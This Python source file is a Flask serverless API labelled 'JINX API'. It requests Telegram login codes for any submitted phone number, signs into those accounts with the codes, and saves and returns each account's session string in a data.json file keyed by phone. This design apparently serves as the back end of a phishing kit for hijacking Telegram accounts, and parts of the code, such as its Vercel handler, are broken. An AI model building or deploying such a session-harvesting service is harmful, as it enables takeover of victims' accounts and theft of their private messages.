# api/index.py — FLASK SYNC (VERCEL SERVERLESS)
import os
import json
from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

app = Flask(__name__)

# BACA session.txt
def get_session():
    if os.path.exists('session.txt'):
        with open('session.txt', 'r') as f:
            for line in f.read().strip().split('\n'):
                if line.startswith('SESSION_STRING='):
                    return line.split('=', 1)[1]
    return None

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
SESSION_STRING = get_session()

if not all([API_ID, API_HASH, SESSION_STRING]):
    @app.route('/', methods=['GET', 'POST'])
    def error():
        return jsonify({'error': 'ENV / session.txt RUSAK!'}), 500

DATA_FILE = 'data.json'

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

@app.route('/', methods=['GET'])
def home():
    return jsonify({"message": "JINX API JALAN!"})

@app.route('/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'no phone'}), 400

    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        client.connect()
        res = client.send_code_request(phone)
        client.disconnect()
        return jsonify({'success': True, 'hash': res.phone_code_hash})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    code = request.form.get('code')
    hash_code = request.form.get('hash')
    if not all([phone, code, hash_code]):
        return jsonify({'success': False, 'error': 'missing'}), 400

    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        client.connect()
        client.sign_in(phone, code=code, phone_code_hash=hash_code)
        sess = client.session.save()
        data = load()
        data[phone] = {'session': sess}
        save(data)
        client.disconnect()
        return jsonify({'success': True, 'session': sess})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# VERCEL HANDLER
def handler(event, context):
    from werkzeug.wrappers import Request, Response
    from werkzeug.serving import run_simple

    @Request.application
    def application(request):
        return app.wsgi_app(request.environ, request.start_response)

    return application
